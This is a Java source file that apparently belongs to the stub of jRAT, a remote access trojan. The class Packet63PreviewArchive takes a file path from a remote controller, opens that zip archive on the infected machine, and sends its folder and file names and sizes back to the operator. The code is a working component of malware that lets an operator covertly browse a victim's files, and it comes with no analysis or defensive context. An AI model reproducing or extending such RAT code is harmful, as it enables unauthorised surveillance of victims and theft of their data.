package se.jrat.stub.packets.incoming;

import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet45ArchivePreview;


public class Packet63PreviewArchive extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();
		ZipFile zip = new ZipFile(file);
		Enumeration<? extends ZipEntry> entries = zip.entries();
		List<ZipEntry> folders = new ArrayList<ZipEntry>();
		List<ZipEntry> files = new ArrayList<ZipEntry>();
		while (entries.hasMoreElements()) {
			ZipEntry entry = entries.nextElement();
			if (entry.isDirectory()) {
				folders.add(entry);
			} else {
				files.add(entry);
			}
		}

		for (ZipEntry entry : folders) {
			con.addToSendQueue(new Packet45ArchivePreview(true, entry.getName(), 0L));
		}

		for (ZipEntry entry : files) {
			con.addToSendQueue(new Packet45ArchivePreview(false, entry.getName(), entry.getSize() / 1024L));

		}

		zip.close();
	}

}
